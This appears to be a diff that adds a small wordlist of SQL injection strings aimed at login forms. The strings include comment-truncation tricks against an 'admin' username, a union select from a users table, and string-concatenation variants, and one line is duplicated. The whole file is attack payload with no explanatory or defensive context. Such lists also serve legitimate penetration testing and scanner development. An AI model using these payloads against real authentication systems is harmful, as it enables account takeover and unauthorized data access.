@@ -1,0 +1,11 @@
+
+admin'-- -
+
+admin' union select * from users where'
+admin' /* 
+
+admin';'
+
+a'||'dmin';'
+
+a'||'dmin';'
